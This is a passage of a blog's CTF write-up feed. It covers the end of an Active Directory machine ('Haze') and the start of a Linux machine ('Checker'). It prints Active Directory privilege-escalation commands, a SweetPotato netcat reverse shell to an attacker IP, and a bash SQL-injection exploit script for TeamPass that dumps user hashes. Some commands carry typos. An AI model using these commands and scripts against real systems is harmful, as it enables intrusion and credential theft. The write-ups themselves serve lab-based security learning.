<img src="/assets/images/605877c5-9868-4437-874b-258fe0b8d05d-export-d3087789-ca72-4924-b87a-29a7d4710b9f/605877c5-9868-4437-874b-258fe0b8d05d-export-d3087789-ca72-4924-b87a-29a7d4710b9f_image_14.png" alt="image.png" />
<br /><br />
<code class="language-plaintext highlighter-rouge">mark.adams</code> is also using the same password, we can check if there are any useful share to obtain more information but this step did not succeed
<br /><br />
<img src="/assets/images/605877c5-9868-4437-874b-258fe0b8d05d-export-d3087789-ca72-4924-b87a-29a7d4710b9f/605877c5-9868-4437-874b-258fe0b8d05d-export-d3087789-ca72-4924-b87a-29a7d4710b9f_image_15.png" alt="image.png" />
<br /><br />
Those credentials might be convenient for enumerating the entire domain using <code class="language-plaintext highlighter-rouge">bloodhound-python</code>
<br /><br />
<img src="/assets/images/605877c5-9868-4437-874b-258fe0b8d05d-export-d3087789-ca72-4924-b87a-29a7d4710b9f/605877c5-9868-4437-874b-258fe0b8d05d-export-d3087789-ca72-4924-b87a-29a7d4710b9f_image_16.png" alt="image.png" />
<br /><br />
<code class="language-plaintext highlighter-rouge">Mark.adams</code> account is member of <code class="language-plaintext highlighter-rouge">GMSA_MANAGERS</code> group
<br /><br />
<img src="/assets/images/605877c5-9868-4437-874b-258fe0b8d05d-export-d3087789-ca72-4924-b87a-29a7d4710b9f/605877c5-9868-4437-874b-258fe0b8d05d-export-d3087789-ca72-4924-b87a-29a7d4710b9f_image_17.png" alt="image.png" />
<br /><br />
We can confirm that using Powershell
<br /><br />
<img src="/assets/images/605877c5-9868-4437-874b-258fe0b8d05d-export-d3087789-ca72-4924-b87a-29a7d4710b9f/605877c5-9868-4437-874b-258fe0b8d05d-export-d3087789-ca72-4924-b87a-29a7d4710b9f_image_18.png" alt="image.png" />
<br /><br />
<img src="/assets/images/605877c5-9868-4437-874b-258fe0b8d05d-export-d3087789-ca72-4924-b87a-29a7d4710b9f/605877c5-9868-4437-874b-258fe0b8d05d-export-d3087789-ca72-4924-b87a-29a7d4710b9f_image_19.png" alt="image.png" />
<br /><br />
Attackers can abuse misconfigured gMSA to escalate privileges. This group (Group Managed Service Account) are assigned to automate password rotation but  only specific accounts should have <code class="language-plaintext highlighter-rouge">readgMSApassword</code> privilege, in this scenario we have compromised a gMSA manager’s member.
<br /><br />
Bloodhound did not display members of gMSA. To enumerate users in the domain and identify which accounts can retrieve gMSA passwords or modify its properties, we can execute the following commands:
<br /><br /></p>
<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">Get</span><span class="o">-</span><span class="n">ADServiceAccount</span> <span class="o">-</span><span class="n">Filter</span> <span class="o">*</span>
<span class="n">Get</span><span class="o">-</span><span class="n">ADServiceAcount</span> <span class="n">Haze</span><span class="o">-</span><span class="n">IT</span><span class="o">-</span><span class="n">Backup</span> <span class="o">-</span><span class="n">Property</span> <span class="n">PrincipalsAllowedToRetrieveManagedPassword</span>
<span class="c1">#Who can modify this property?
</span><span class="err">$</span><span class="n">backupuser</span> <span class="o">=</span> <span class="n">Get</span><span class="o">-</span><span class="n">ADServiceAccount</span> <span class="n">Haze</span><span class="o">-</span><span class="n">IT</span><span class="o">-</span><span class="n">Backup</span>
<span class="p">(</span><span class="n">Get</span><span class="o">-</span><span class="n">Acl</span> <span class="s">"AD:\$($backupuser.DistinguishedName)"</span><span class="p">).</span><span class="n">Access</span> <span class="o">|</span> <span class="n">Where</span><span class="o">-</span><span class="n">Object</span> <span class="p">{</span><span class="err">$</span><span class="n">_</span><span class="p">.</span><span class="n">IdentityReference</span> <span class="o">-</span><span class="n">like</span> <span class="s">'*gMSA_Manage'</span><span class="p">}</span>
</code></pre></div></div>
<p><br /><br />
Other options to shortcut this enumeration could be:
<br /><br /></p>
<ul>
  <li><code class="language-plaintext highlighter-rouge">get writeables</code> in <code class="language-plaintext highlighter-rouge">bloodyAD</code></li>
  <li>Find-<code class="language-plaintext highlighter-rouge">InterestingDomainAcl</code> in <code class="language-plaintext highlighter-rouge">PowerView.ps1</code> module
<br /><br />
Once we know gMSA managers can set Haze-IT-Backup property to retrieve its managed password we proceed to abuse this
<br /><br />
    <div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">Set</span><span class="o">-</span><span class="n">ADServiceAccount</span> <span class="o">-</span><span class="n">Identity</span> <span class="s">"Haze-IT-Backup"</span> <span class="o">-</span><span class="n">PrincipalsAllowedToRetrieveManagedPassword</span> <span class="s">"mark.adams"</span>
</code></pre></div>    </div>
    <p><br /><br />
<img src="/assets/images/605877c5-9868-4437-874b-258fe0b8d05d-export-d3087789-ca72-4924-b87a-29a7d4710b9f/605877c5-9868-4437-874b-258fe0b8d05d-export-d3087789-ca72-4924-b87a-29a7d4710b9f_image_20.png" alt="image.png" />
<br /><br />
This misconfiguration can be leverage to obtain the NTLM hash of the backup account
<br /><br /></p>
    <div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">nxc</span> <span class="n">ldap</span> <span class="n">ip</span> <span class="o">-</span><span class="n">u</span> <span class="n">user</span> <span class="o">-</span><span class="n">p</span> <span class="n">password</span> <span class="o">--</span><span class="n">gmsa</span>
</code></pre></div>    </div>
    <p><br /><br />
<img src="/assets/images/605877c5-9868-4437-874b-258fe0b8d05d-export-d3087789-ca72-4924-b87a-29a7d4710b9f/605877c5-9868-4437-874b-258fe0b8d05d-export-d3087789-ca72-4924-b87a-29a7d4710b9f_image_21.png" alt="image.png" />
<br /><br />
Haze-IT-Backup has WriteOwner permissions over support_services group, but seems to be something else to investigate
<br /><br />
<img src="/assets/images/605877c5-9868-4437-874b-258fe0b8d05d-export-d3087789-ca72-4924-b87a-29a7d4710b9f/605877c5-9868-4437-874b-258fe0b8d05d-export-d3087789-ca72-4924-b87a-29a7d4710b9f_image_22.png" alt="image.png" />
<br /><br />
Execute the <code class="language-plaintext highlighter-rouge">bloodhound-python</code> collector again, this time using backup user’s credentials
<br /><br />
<img src="/assets/images/605877c5-9868-4437-874b-258fe0b8d05d-export-d3087789-ca72-4924-b87a-29a7d4710b9f/605877c5-9868-4437-874b-258fe0b8d05d-export-d3087789-ca72-4924-b87a-29a7d4710b9f_image_23.png" alt="image.png" />
<br /><br />
Now the path forward is clearer
<br /><br />
<img src="/assets/images/605877c5-9868-4437-874b-258fe0b8d05d-export-d3087789-ca72-4924-b87a-29a7d4710b9f/605877c5-9868-4437-874b-258fe0b8d05d-export-d3087789-ca72-4924-b87a-29a7d4710b9f_image_24.png" alt="image.png" />
<br /><br />
Set <code class="language-plaintext highlighter-rouge">haze-it-backup</code> as the new owner of <code class="language-plaintext highlighter-rouge">support_services</code> and grant it <code class="language-plaintext highlighter-rouge">full-control</code> over the group
<br /><br /></p>
    <div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">impacker</span><span class="o">-</span><span class="n">owneredit</span> <span class="o">-</span><span class="n">action</span> <span class="n">write</span> <span class="o">-</span><span class="n">new</span><span class="o">-</span><span class="n">owner</span> <span class="s">'new-owner'</span> <span class="o">-</span><span class="n">target</span><span class="o">-</span><span class="n">dn</span> <span class="s">'target-dn'</span> <span class="s">'domain'</span><span class="o">/</span><span class="s">'user'</span> <span class="o">-</span><span class="n">no</span><span class="o">-</span><span class="k">pass</span> <span class="o">-</span><span class="n">hashes</span> <span class="p">:</span><span class="nb">hash</span>
<span class="n">impacket</span><span class="o">-</span><span class="n">dacledit</span> <span class="o">-</span><span class="n">action</span> <span class="n">write</span> <span class="o">-</span><span class="n">rights</span> <span class="n">FullControl</span> <span class="o">-</span><span class="n">principal</span> <span class="s">'attacker'</span> <span class="o">-</span><span class="n">target</span><span class="o">-</span><span class="n">dn</span> <span class="s">'target-dn'</span> <span class="s">'domain'</span><span class="o">/</span><span class="s">'user'</span> <span class="o">-</span><span class="n">no</span><span class="o">-</span><span class="k">pass</span> <span class="o">-</span><span class="n">hashes</span> <span class="p">:</span><span class="nb">hash</span>
<span class="c1">#Or without imapcket 
</span><span class="n">pth</span><span class="o">-</span><span class="n">net</span> <span class="n">rpc</span> <span class="n">group</span> <span class="n">addmem</span> <span class="s">"SUPPORT_SERVICE"</span> <span class="n">attackeruser</span> <span class="o">-</span><span class="n">U</span> <span class="s">'domain'</span><span class="o">/</span><span class="s">'attacker'</span><span class="o">%</span><span class="s">'fffto_supply_right_format'</span><span class="p">:</span><span class="s">'hash'</span> <span class="o">-</span><span class="n">S</span> <span class="n">ip</span>
</code></pre></div>    </div>
    <p><br /><br />
<img src="/assets/images/605877c5-9868-4437-874b-258fe0b8d05d-export-d3087789-ca72-4924-b87a-29a7d4710b9f/605877c5-9868-4437-874b-258fe0b8d05d-export-d3087789-ca72-4924-b87a-29a7d4710b9f_image_25.png" alt="image.png" />
<br /><br />
<img src="/assets/images/605877c5-9868-4437-874b-258fe0b8d05d-export-d3087789-ca72-4924-b87a-29a7d4710b9f/605877c5-9868-4437-874b-258fe0b8d05d-export-d3087789-ca72-4924-b87a-29a7d4710b9f_image_26.png" alt="image.png" />
<br /><br />
We have three options right now:
<br /><br /></p>
  </li>
  <li>Change edward.martin password’s (Faster but not a clean OPSEC, and not allowed in this machine)
<br /><br /></li>
  <li>Request a TGT again and use certipy shadow credential to obtain edward hash (Automated and faster)
<br /><br /></li>
  <li>Using pywhisker → gettgtpkinit → getnthash (A manual and more granular approach)
<br /><br />
    <div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">#To update msDS-KeyCredentialLink and obtain a PFX from this link
</span><span class="n">python3</span> <span class="n">pywhisker</span><span class="p">.</span><span class="n">py</span> <span class="o">-</span><span class="n">u</span> <span class="s">'attacker'</span> <span class="o">-</span><span class="n">H</span> <span class="p">:</span><span class="nb">hash</span> <span class="o">-</span><span class="n">d</span> <span class="n">domain</span> <span class="o">-</span><span class="n">t</span> <span class="s">'target'</span> <span class="o">-</span><span class="n">a</span> <span class="n">add</span>
</code></pre></div>    </div>
    <p><br /><br />
<img src="/assets/images/605877c5-9868-4437-874b-258fe0b8d05d-export-d3087789-ca72-4924-b87a-29a7d4710b9f/605877c5-9868-4437-874b-258fe0b8d05d-export-d3087789-ca72-4924-b87a-29a7d4710b9f_image_27.png" alt="image.png" />
<br /><br /></p>
    <div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">#Get a tgt using the PFX file generated previously
</span><span class="n">python</span> <span class="n">gettgtpkinit</span> <span class="o">-</span><span class="n">cert</span><span class="o">-</span><span class="n">pfx</span> <span class="p">.</span><span class="n">pxf</span> <span class="o">-</span><span class="n">pfx</span><span class="o">-</span><span class="k">pass</span> <span class="n">pfxpass</span> <span class="o">-</span><span class="n">dc</span><span class="o">-</span><span class="n">ip</span> <span class="n">ip</span> <span class="n">domain</span><span class="o">/</span><span class="n">target</span> <span class="n">target</span><span class="p">.</span><span class="n">ccfile</span>
</code></pre></div>    </div>
    <p><br /><br />
<img src="/assets/images/605877c5-9868-4437-874b-258fe0b8d05d-export-d3087789-ca72-4924-b87a-29a7d4710b9f/605877c5-9868-4437-874b-258fe0b8d05d-export-d3087789-ca72-4924-b87a-29a7d4710b9f_image_28.png" alt="image.png" />
<br /><br />
<img src="/assets/images/605877c5-9868-4437-874b-258fe0b8d05d-export-d3087789-ca72-4924-b87a-29a7d4710b9f/605877c5-9868-4437-874b-258fe0b8d05d-export-d3087789-ca72-4924-b87a-29a7d4710b9f_image_29.png" alt="image.png" />
<br /><br /></p>
    <div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">#Get a NT hash using that tgt
</span><span class="n">python</span> <span class="n">getnthash</span><span class="p">.</span><span class="n">py</span> <span class="o">-</span><span class="n">dc</span><span class="o">-</span><span class="n">ip</span> <span class="n">ip</span> <span class="o">-</span><span class="n">key</span> <span class="n">key</span> <span class="n">domain</span><span class="o">/</span><span class="n">target</span>
</code></pre></div>    </div>
    <p><br /><br />
<img src="/assets/images/605877c5-9868-4437-874b-258fe0b8d05d-export-d3087789-ca72-4924-b87a-29a7d4710b9f/605877c5-9868-4437-874b-258fe0b8d05d-export-d3087789-ca72-4924-b87a-29a7d4710b9f_image_30.png" alt="image.png" />
<br /><br />
We can spawn a <code class="language-plaintext highlighter-rouge">edward.martin</code> shell using <code class="language-plaintext highlighter-rouge">evil-winrm</code> to obtain the user flag
<br /><br />
<img src="/assets/images/605877c5-9868-4437-874b-258fe0b8d05d-export-d3087789-ca72-4924-b87a-29a7d4710b9f/605877c5-9868-4437-874b-258fe0b8d05d-export-d3087789-ca72-4924-b87a-29a7d4710b9f_image_31.png" alt="image.png" />
<br /><br /></p>
    <h1 id="3priv-esc">3.Priv esc</h1>
    <p><br /><br />
Check the splunk directories until you locate a backup
<br /><br />
<img src="/assets/images/605877c5-9868-4437-874b-258fe0b8d05d-export-d3087789-ca72-4924-b87a-29a7d4710b9f/605877c5-9868-4437-874b-258fe0b8d05d-export-d3087789-ca72-4924-b87a-29a7d4710b9f_image_32.png" alt="image.png" />
<br /><br />
Another version of the files we have abused early was in there with different hash and different secret
<br /><br />
<img src="/assets/images/605877c5-9868-4437-874b-258fe0b8d05d-export-d3087789-ca72-4924-b87a-29a7d4710b9f/605877c5-9868-4437-874b-258fe0b8d05d-export-d3087789-ca72-4924-b87a-29a7d4710b9f_image_33.png" alt="image.png" />
<br /><br />
<img src="/assets/images/605877c5-9868-4437-874b-258fe0b8d05d-export-d3087789-ca72-4924-b87a-29a7d4710b9f/605877c5-9868-4437-874b-258fe0b8d05d-export-d3087789-ca72-4924-b87a-29a7d4710b9f_image_34.png" alt="image.png" />
<br /><br />
<img src="/assets/images/605877c5-9868-4437-874b-258fe0b8d05d-export-d3087789-ca72-4924-b87a-29a7d4710b9f/605877c5-9868-4437-874b-258fe0b8d05d-export-d3087789-ca72-4924-b87a-29a7d4710b9f_image_35.png" alt="image.png" />
<br /><br />
Crack the hash we found
<br /><br />
<img src="/assets/images/605877c5-9868-4437-874b-258fe0b8d05d-export-d3087789-ca72-4924-b87a-29a7d4710b9f/605877c5-9868-4437-874b-258fe0b8d05d-export-d3087789-ca72-4924-b87a-29a7d4710b9f_image_36.png" alt="image.png" />
<br /><br />
It is supposed <code class="language-plaintext highlighter-rouge">alexander.green</code> credentials
<br /><br />
<img src="/assets/images/605877c5-9868-4437-874b-258fe0b8d05d-export-d3087789-ca72-4924-b87a-29a7d4710b9f/605877c5-9868-4437-874b-258fe0b8d05d-export-d3087789-ca72-4924-b87a-29a7d4710b9f_image_37.png" alt="image.png" />
<br /><br />
Log in with that password in the main web application service as the admin user 
<br /><br />
<img src="/assets/images/605877c5-9868-4437-874b-258fe0b8d05d-export-d3087789-ca72-4924-b87a-29a7d4710b9f/605877c5-9868-4437-874b-258fe0b8d05d-export-d3087789-ca72-4924-b87a-29a7d4710b9f_image_38.png" alt="image.png" />
<br /><br />
From here, it is straightforward, find how to exploit a reverse shell in splunk 
<br /><br />
<img src="/assets/images/605877c5-9868-4437-874b-258fe0b8d05d-export-d3087789-ca72-4924-b87a-29a7d4710b9f/605877c5-9868-4437-874b-258fe0b8d05d-export-d3087789-ca72-4924-b87a-29a7d4710b9f_image_39.png" alt="image.png" />
<br /><br />
Set ip and port in <code class="language-plaintext highlighter-rouge">run.ps1</code> as we are dealing with a Windows machine 
<br /><br />
<img src="/assets/images/605877c5-9868-4437-874b-258fe0b8d05d-export-d3087789-ca72-4924-b87a-29a7d4710b9f/605877c5-9868-4437-874b-258fe0b8d05d-export-d3087789-ca72-4924-b87a-29a7d4710b9f_image_40.png" alt="image.png" />
<br /><br />
Follow the instructions in the repository. Compress those files
<br /><br />
<img src="/assets/images/605877c5-9868-4437-874b-258fe0b8d05d-export-d3087789-ca72-4924-b87a-29a7d4710b9f/605877c5-9868-4437-874b-258fe0b8d05d-export-d3087789-ca72-4924-b87a-29a7d4710b9f_image_41.png" alt="image.png" />
<br /><br />
Then, upload them as an app installation in splunk
<br /><br />
<img src="/assets/images/605877c5-9868-4437-874b-258fe0b8d05d-export-d3087789-ca72-4924-b87a-29a7d4710b9f/605877c5-9868-4437-874b-258fe0b8d05d-export-d3087789-ca72-4924-b87a-29a7d4710b9f_image_42.png" alt="image.png" />
<br /><br />
It is successfully installed, we only need to enable it to trigger the reverse shell
<br /><br />
<img src="/assets/images/605877c5-9868-4437-874b-258fe0b8d05d-export-d3087789-ca72-4924-b87a-29a7d4710b9f/605877c5-9868-4437-874b-258fe0b8d05d-export-d3087789-ca72-4924-b87a-29a7d4710b9f_image_43.png" alt="image.png" />
<br /><br />
After obtaining a shell, enumerating Alexander’s privileges we discovered <code class="language-plaintext highlighter-rouge">SeImpersonatePriviele</code> 
<br /><br />
<img src="/assets/images/605877c5-9868-4437-874b-258fe0b8d05d-export-d3087789-ca72-4924-b87a-29a7d4710b9f/605877c5-9868-4437-874b-258fe0b8d05d-export-d3087789-ca72-4924-b87a-29a7d4710b9f_image_44.png" alt="image.png" />
<br /><br />
This privilege allow us to use a process to impersonate another user, <code class="language-plaintext highlighter-rouge">SweetPotato</code> pr <code class="language-plaintext highlighter-rouge">godpotato</code> are recommended tools for this task
<br /><br /></p>
    <div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="p">.</span>\<span class="n">SweetPotato</span><span class="p">.</span><span class="n">exe</span> <span class="o">-</span><span class="n">a</span> <span class="s">'type c:\users</span><span class="se">\a</span><span class="s">dministrator\desktop</span><span class="se">\r</span><span class="s">oot.txt'</span>
<span class="c1">#Or upload a nc.exe file and execute
</span><span class="p">.</span>\<span class="n">SweetPotato</span><span class="p">.</span><span class="n">exe</span> <span class="o">-</span><span class="n">a</span> <span class="s">"C:\programdata</span><span class="se">\n</span><span class="s">c64.exe 10.10.14.6 444 -e cmd.exe"</span>
</code></pre></div>    </div>
    <p><br /><br />
<img src="/assets/images/605877c5-9868-4437-874b-258fe0b8d05d-export-d3087789-ca72-4924-b87a-29a7d4710b9f/605877c5-9868-4437-874b-258fe0b8d05d-export-d3087789-ca72-4924-b87a-29a7d4710b9f_image_45.png" alt="image.png" />
<br /><br />
Machine pwned@!@@!@
<script src="/assets/js/matrix-overlay.js"></script></p>
  </li>
</ul>

<link rel="stylesheet" href="/assets/css/imagesstyle.css" />]]></content><author><name>GitHub User</name></author><category term="writeups" /><summary type="html"><![CDATA[Haze]]></summary></entry><entry><title type="html">Checker-Linux-Hard</title><link href="https://your-site-url/writeups/2025/07/17/1b9be0c7-e5a3-43f1-8122-172edb697ea9-export-4073cd0e-fd32-493d-a9a7-9a3c930aa51e.html" rel="alternate" type="text/html" title="Checker-Linux-Hard" /><published>2025-07-17T16:05:57+00:00</published><updated>2025-07-17T16:05:57+00:00</updated><id>https://your-site-url/writeups/2025/07/17/1b9be0c7-e5a3-43f1-8122-172edb697ea9-export-4073cd0e-fd32-493d-a9a7-9a3c930aa51e</id><content type="html" xml:base="https://your-site-url/writeups/2025/07/17/1b9be0c7-e5a3-43f1-8122-172edb697ea9-export-4073cd0e-fd32-493d-a9a7-9a3c930aa51e.html"><![CDATA[<h1 id="checker">Checker</h1>

<h1 id="1-enumeration">1. Enumeration</h1>
<p><br /><br />
As always we start with nmap, there are three ports open
<br /><br />
<img src="/assets/images/1b9be0c7-e5a3-43f1-8122-172edb697ea9-export-4073cd0e-fd32-493d-a9a7-9a3c930aa51e/1b9be0c7-e5a3-43f1-8122-172edb697ea9-export-4073cd0e-fd32-493d-a9a7-9a3c930aa51e_image.png" alt="image.png" />
<br /><br />
In port 80 there is a bookstack login, default credentials do not work, we cannot register a new user
<br /><br />
<img src="/assets/images/1b9be0c7-e5a3-43f1-8122-172edb697ea9-export-4073cd0e-fd32-493d-a9a7-9a3c930aa51e/1b9be0c7-e5a3-43f1-8122-172edb697ea9-export-4073cd0e-fd32-493d-a9a7-9a3c930aa51e_image_1.png" alt="image.png" />
<br /><br />
We also can reset passwords
<br /><br />
<img src="/assets/images/1b9be0c7-e5a3-43f1-8122-172edb697ea9-export-4073cd0e-fd32-493d-a9a7-9a3c930aa51e/1b9be0c7-e5a3-43f1-8122-172edb697ea9-export-4073cd0e-fd32-493d-a9a7-9a3c930aa51e_image_2.png" alt="image.png" />
<br /><br />
TeamPass service is running on port 8080
<br /><br />
<img src="/assets/images/1b9be0c7-e5a3-43f1-8122-172edb697ea9-export-4073cd0e-fd32-493d-a9a7-9a3c930aa51e/1b9be0c7-e5a3-43f1-8122-172edb697ea9-export-4073cd0e-fd32-493d-a9a7-9a3c930aa51e_image_3.png" alt="image.png" />
<br /><br />
Search a little bit to find a vulnerability
<br /><br />
<img src="/assets/images/1b9be0c7-e5a3-43f1-8122-172edb697ea9-export-4073cd0e-fd32-493d-a9a7-9a3c930aa51e/1b9be0c7-e5a3-43f1-8122-172edb697ea9-export-4073cd0e-fd32-493d-a9a7-9a3c930aa51e_image_4.png" alt="image.png" />
<br /><br />
We don’t have any teampass version disclosed, but a poc of CVE-2023-1545 is present in here and we don’t lose anything if we try
<br /><br />
<img src="/assets/images/1b9be0c7-e5a3-43f1-8122-172edb697ea9-export-4073cd0e-fd32-493d-a9a7-9a3c930aa51e/1b9be0c7-e5a3-43f1-8122-172edb697ea9-export-4073cd0e-fd32-493d-a9a7-9a3c930aa51e_image_5.png" alt="image.png" />
<br /><br />
It is performing a sql injection giving it a new fake file that is not saved in the database but is compiled with the purpose of spoof the list of valid users, making a login as admin with a lure hash, extracting all users directly from the database.
<br /><br /></p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c">#Check number of arguments</span>
<span class="k">if</span> <span class="o">[</span> <span class="s2">"$#"</span> <span class="nt">-lt</span> 1]<span class="p">;</span> <span class="k">then</span>
	<span class="c">#Output the name of the script</span>
	<span class="nb">echo</span> <span class="s2">"Usage: </span><span class="nv">$0</span><span class="s2"> &lt;base-url&gt;"</span> 
	<span class="nb">exit </span>1
<span class="k">fi</span>

<span class="c">#Set vulnerable endpoint</span>
<span class="nv">vulnerable_url</span><span class="o">=</span><span class="s2">"</span><span class="nv">$1</span><span class="s2">/api/index.php/authorize"</span>

<span class="c">#Check if the api is enabled</span>
<span class="nv">check</span><span class="o">=</span><span class="si">$(</span>curl <span class="nt">--silent</span> <span class="s2">"</span><span class="nv">$vulnerable_url</span><span class="s2">"</span><span class="si">)</span>
<span class="k">if </span><span class="nb">echo</span> <span class="s2">"</span><span class="nv">$check</span><span class="s2">"</span> | <span class="nb">grep</span> <span class="nt">-q</span> <span class="s2">"API usage is not allowed"</span><span class="p">;</span> <span class="k">then
	</span><span class="nb">echo</span> <span class="s2">"API feature no enabled, not vulnerable"</span>
	<span class="nb">exit </span>1
<span class="k">fi</span>

<span class="c">#Define a random bcrypt hash to act as lure</span>
<span class="c">#htpasswd -bnBC 10 "" pwned | tr -d ':\n'</span>
<span class="nv">random_hash</span><span class="o">=</span><span class="s1">'randomhash'</span>

exec_sql<span class="o">()</span> <span class="o">{</span>
	<span class="c">#SELECT * FROM invitados WHERE nombre = 'none'</span>
	<span class="c">#UNION</span>
	<span class="c">#SELECT this is admin info FROM users WHERE login='admin'</span>
	<span class="nv">inject</span><span class="o">=</span><span class="s2">"none' UNION SELECT id, '</span><span class="nv">$random_hash</span><span class="s2">', (</span><span class="nv">$1</span><span class="s2">), private_key, personal_folder, fonction_id, groupes_interdits, 'foo' FROM temapass_users WHERE login='admin'"</span>
	<span class="nv">data</span><span class="o">=</span><span class="s2">"{</span><span class="se">\"</span><span class="s2">login</span><span class="se">\"</span><span class="s2">:</span><span class="se">\"</span><span class="s2">"</span><span class="nv">$inject</span><span class="se">\"</span><span class="s2">",</span><span class="se">\"</span><span class="s2">password</span><span class="se">\"</span><span class="s2">:</span><span class="se">\"</span><span class="s2">newpass</span><span class="se">\"</span><span class="s2">,</span><span class="se">\"</span><span class="s2">apikey</span><span class="se">\"</span><span class="s2">:</span><span class="se">\"</span><span class="s2">foo</span><span class="se">\"</span><span class="s2">}"</span>
	<span class="nv">token</span><span class="o">=</span><span class="si">$(</span>curl <span class="nt">--silent</span> <span class="nt">--header</span> <span class="s2">"Content-Type: application/json"</span> <span class="nt">-X</span> POST <span class="nt">--data</span> <span class="s2">"</span><span class="nv">$data</span><span class="s2">"</span> <span class="s2">"</span><span class="nv">$vulnerable_url</span><span class="s2"> | jq -r '.token'"</span><span class="si">)</span>
<span class="o">}</span>

<span class="c">#$Change $1 with the query replaced with public key</span>
<span class="nb">users</span><span class="o">=</span><span class="si">$(</span>exec_sql <span class="s2">"SELECT COUNT(*) FROM teampass_users WHERE pw != ''"</span><span class="si">)</span>

<span class="nb">echo</span> <span class="s2">"There are </span><span class="nv">$users</span><span class="s2"> users in the system:"</span>

<span class="k">for </span>i <span class="k">in</span> <span class="sb">`</span><span class="nb">seq </span>0 <span class="k">$((</span><span class="nv">$users</span><span class="o">-</span><span class="m">1</span><span class="k">))</span><span class="sb">`</span><span class="p">;</span> <span class="k">do
	</span><span class="nv">username</span><span class="o">=</span><span class="si">$(</span>exec_sql <span class="s2">"SELECT login FROM teampass_users WHERE pw != ORDER BY login ASC LIMIT </span><span class="nv">$i</span><span class="s2">,1"</span><span class="si">)</span>
	<span class="nv">password</span><span class="o">=</span><span class="si">$(</span>exec_sql <span class="s2">"SELECT pw FROM teampass_users WHERE pw != '' ORDER BY login ASC LIMIT </span><span class="nv">$i</span><span class="s2">,1"</span><span class="si">)</span>
	<span class="nb">echo</span> <span class="s2">"</span><span class="nv">$username</span><span class="s2">:</span><span class="nv">$password</span><span class="s2">"</span>
<span class="k">done</span>
</code></pre></div></div>
<p><br /><br />
<img src="/assets/images/1b9be0c7-e5a3-43f1-8122-172edb697ea9-export-4073cd0e-fd32-493d-a9a7-9a3c930aa51e/1b9be0c7-e5a3-43f1-8122-172edb697ea9-export-4073cd0e-fd32-493d-a9a7-9a3c930aa51e_image_6.png" alt="image.png" />
<br /><br /></p>
<h1 id="2-user-flag">2. User flag</h1>
<p><br /><br />
Once we have admin user, we can crack it with john
<br /><br />
<img src="/assets/images/1b9be0c7-e5a3-43f1-8122-172edb697ea9-export-4073cd0e-fd32-493d-a9a7-9a3c930aa51e/1b9be0c7-e5a3-43f1-8122-172edb697ea9-export-4073cd0e-fd32-493d-a9a7-9a3c930aa51e_image_7.png" alt="image.png" />
<br /><br />
In team pass dashboard there are more bob’s passwords 
<br /><br />
<img src="/assets/images/1b9be0c7-e5a3-43f1-8122-172edb697ea9-export-4073cd0e-fd32-493d-a9a7-9a3c930aa51e/1b9be0c7-e5a3-43f1-8122-172edb697ea9-export-4073cd0e-fd32-493d-a9a7-9a3c930aa51e_image_8.png" alt="image.png" />
<br /><br />
This seems interesting, let’s try to login in ssh
<br /><br />
<img src="/assets/images/1b9be0c7-e5a3-43f1-8122-172edb697ea9-export-4073cd0e-fd32-493d-a9a7-9a3c930aa51e/1b9be0c7-e5a3-43f1-8122-172edb697ea9-export-4073cd0e-fd32-493d-a9a7-9a3c930aa51e_image_9.png" alt="image.png" />
<br /><br />
It has 2FA and we need a verification code 
<br /><br />
<img src="/assets/images/1b9be0c7-e5a3-43f1-8122-172edb697ea9-export-4073cd0e-fd32-493d-a9a7-9a3c930aa51e/1b9be0c7-e5a3-43f1-8122-172edb697ea9-export-4073cd0e-fd32-493d-a9a7-9a3c930aa51e_image_10.png" alt="image.png" />
<br /><br />
Stand a little and check port 80 where is the bookstack framework and we have access thanks to the previous findings, we can create books on it
<br /><br />
<img src="/assets/images/1b9be0c7-e5a3-43f1-8122-172edb697ea9-export-4073cd0e-fd32-493d-a9a7-9a3c930aa51e/1b9be0c7-e5a3-43f1-8122-172edb697ea9-export-4073cd0e-fd32-493d-a9a7-9a3c930aa51e_image_11.png" alt="image.png" />
<br /><br />
In the source code the version is disclosed
<br /><br />
<img src="/assets/images/1b9be0c7-e5a3-43f1-8122-172edb697ea9-export-4073cd0e-fd32-493d-a9a7-9a3c930aa51e/1b9be0c7-e5a3-43f1-8122-172edb697ea9-export-4073cd0e-fd32-493d-a9a7-9a3c930aa51e_image_12.png" alt="image.png" />
<br /><br />
It seems to be vulnerable to CVE-2023-6199 Local File Reading via Blind Server Side Request Forgery
<br /><br />
<img src="/assets/images/1b9be0c7-e5a3-43f1-8122-172edb697ea9-export-4073cd0e-fd32-493d-a9a7-9a3c930aa51e/1b9be0c7-e5a3-43f1-8122-172edb697ea9-export-4073cd0e-fd32-493d-a9a7-9a3c930aa51e_image_13.png" alt="image.png" />
<br /><br />
<img src="/assets/images/1b9be0c7-e5a3-43f1-8122-172edb697ea9-export-4073cd0e-fd32-493d-a9a7-9a3c930aa51e/1b9be0c7-e5a3-43f1-8122-172edb697ea9-export-4073cd0e-fd32-493d-a9a7-9a3c930aa51e_image_14.png" alt="image.png" />
<br /><br />
The attacker must have writer permissions. As we saw before bob can create and delete books
<br /><br />
<img src="/assets/images/1b9be0c7-e5a3-43f1-8122-172edb697ea9-export-4073cd0e-fd32-493d-a9a7-9a3c930aa51e/1b9be0c7-e5a3-43f1-8122-172edb697ea9-export-4073cd0e-fd32-493d-a9a7-9a3c930aa51e_image_15.png" alt="image.png" />
<br /><br />
<img src="/assets/images/1b9be0c7-e5a3-43f1-8122-172edb697ea9-export-4073cd0e-fd32-493d-a9a7-9a3c930aa51e/1b9be0c7-e5a3-43f1-8122-172edb697ea9-export-4073cd0e-fd32-493d-a9a7-9a3c930aa51e_image_16.png" alt="image.png" />
<br /><br />
Searching around internet there is a way to enable 2FA through ssh via google-authenticator
<br /><br />
